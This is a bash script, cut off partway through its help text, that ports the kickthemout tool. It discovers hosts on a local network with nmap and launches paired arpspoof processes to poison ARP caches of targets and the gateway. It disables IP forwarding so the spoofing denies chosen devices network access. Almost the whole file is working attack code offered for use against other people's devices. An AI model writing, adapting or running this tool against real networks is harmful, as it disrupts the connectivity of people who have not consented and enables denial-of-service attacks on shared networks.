#!/bin/bash

# A bash script to kick devices off your network.
# This script is a bash equivalent of the original kickthemout.py script.
# It performs ARP spoofing attacks to deny network access to one, some, or all devices
# on the local network. It is designed to be interactive, robust, and safe.
# This script is a sophisticated, interactive, and feature-rich Bash utility designed to mirror and expand upon the functionality of the original kickthemout.py tool. Its core
# purpose is to discover devices on a local area network and execute ARP spoofing attacks to deny network access to specific targets, with multiple levels of user control and safety checks.

# Dependencies: nmap, arpspoof (from dsniff package)

# Root Enforcement:
# This block ensures the script is always run with root privileges, which are
# necessary for network operations like ARP spoofing and modifying IP forwarding.
# If not run as root, it will automatically attempt to re-execute itself using sudo.
if [ "$EUID" -ne 0 ]; then
	echo -e "\e[1;48;5;202m" "Please run as root or with sudo" "\e[0m"
	sudo "$0" # Re-run the script with sudo
	exit 1
fi

# --- Functions ---

# check_dependencies:
# Verifies that all necessary external tools (nmap and arpspoof=from dsniff package) are installed
# and available in the system's PATH. Exits with an error if any dependency
# is missing, guiding the user to install them.
check_dependencies() {
	echo "Checking for dependencies..."
	for cmd in nmap arpspoof; do
		if ! command -v "$cmd" &>/dev/null; then
			echo "Error: $cmd is not installed. Please install it to continue."
			exit 1
		fi
	done
	echo "Dependencies are satisfied."
}

# get_gateway_ip_for_interface:
# Retrieves the IP address of the default gateway for a *specific* network interface.
# This is crucial in environments with multiple network interfaces, ensuring the
# correct gateway is targeted for the chosen interface.
# Arguments: $1 = Interface name (e.g., eth0, wlan0)
get_gateway_ip_for_interface() {
	ip -o -4 route show to default dev "$1" | awk '{print $3}'
}

# scan_network:
# Performs a network scan using nmap to discover active hosts on a given network range.
# It uses a "ping scan" (-sn) for speed and extracts both IP and MAC addresses
# of responsive devices for easier identification by the user.
# Arguments: $1 = Network range in CIDR notation (e.g., 192.168.1.0/24)
scan_network() {
	local network_range=$1
	nmap -sn "$network_range" -oG - | awk '/Up$/{print $2" "$3}'
}

# start_attack:
# Initiates the ARP spoofing attack on one or more target IP addresses.
# This function is responsible for critical setup and execution:
# 1. Manages IP forwarding to ensure a denial-of-service attack.
# 2. Launches multiple arpspoof processes in the background.
# 3. Sets up a trap to gracefully stop the attack upon Ctrl+C.
# Arguments: $1 = Gateway IP, $2 = Interface, $3+ = Target IP(s)
start_attack() {
	local gateway_ip=$1
	local interface=$2
	shift 2 # Shift parameters to access targets array easily
	local targets=("$@")

	arpspoof_pids=() # Array to store PIDs of background arpspoof processes

	echo "Starting ARP spoofing attack on " "${targets[@]}"
	echo "Press Ctrl+C to stop the attack."

	# IP Forwarding Management:
	# Temporarily disable IP forwarding to prevent the attacker's machine
	# from routing traffic for the victim. This ensures the attack acts
	# as a denial-of-service (kicking off) rather than a Man-in-the-Middle.
	original_ip_forward=$(cat /proc/sys/net/ipv4/ip_forward)
	echo 0 >/proc/sys/net/ipv4/ip_forward

	# Trap for graceful shutdown:
	# Ensures the stop_attack function is called to clean up processes
	# and restore network settings if the script is interrupted.
	trap 'stop_attack; exit' SIGINT

	# Launch arpspoof processes for each target:
	# Two arpspoof commands are run per target to poison both the target's
	# and the gateway's ARP caches, effectively isolating the target.
	for target_ip in "${targets[@]}"; do
		arpspoof -i "$interface" -t "$target_ip" "$gateway_ip" &
		arpspoof_pids+=($!) # Store PID of the first arpspoof process
		arpspoof -i "$interface" -t "$gateway_ip" "$target_ip" &
		arpspoof_pids+=($!) # Store PID of the second arpspoof process
	done

	# Wait for arpspoof processes to finish (they run indefinitely until killed)
	for pid in "${arpspoof_pids[@]}"; do
		wait "$pid" # This will pause until the PIDs are terminated by stop_attack
	done
}

# stop_attack:
# Cleans up after the ARP spoofing attack, ensuring no lingering processes
# and restoring the system's network configuration.
# This function is called by the SIGINT trap upon script interruption.
stop_attack() {
	echo "Stopping ARP spoofing attack and restoring network..."
	# Kill all background arpspoof processes that were launched.
	for pid in "${arpspoof_pids[@]}"; do
		kill "$pid" 2>/dev/null # Suppress error if process already died
	done

	# Restore IP Forwarding:
	# Reverts the IP forwarding setting to its original value, ensuring the
	# system's routing behavior returns to normal after the attack.
	echo "$original_ip_forward" >/proc/sys/net/ipv4/ip_forward

	echo "Attack stopped."
}

# get_local_ip:
# Determines the local IP address of the machine for a specified network interface.
# This is used for self-exclusion in the 'kick all' mode to prevent the script
# from attacking its own host.
# Arguments: $1 = Interface name (e.g., eth0, wlan0)
get_local_ip() {
	ip -o -4 addr show dev "$1" | awk '{print $4}' | cut -d/ -f1
}

# display_help:
# Shows detailed information about the script, including its purpose, usage,
# dependencies, attack modes, and a disclaimer. It pauses for user input
# and clears the screen to improve readability and user experience.
display_help() {
	echo "
KickThemOut Bash Script - Help & About

Purpose:
  This script is a Bash equivalent of the original kickthemout.py tool.
  It performs ARP spoofing attacks to deny network access to one, some,
  or all selected devices on your local network.

Usage:
  Run the script with root privileges:
    sudo ./kickthemout.sh

Dependencies:
  - nmap: For network host discovery.
  - arpspoof (from dsniff package): For executing ARP spoofing attacks.
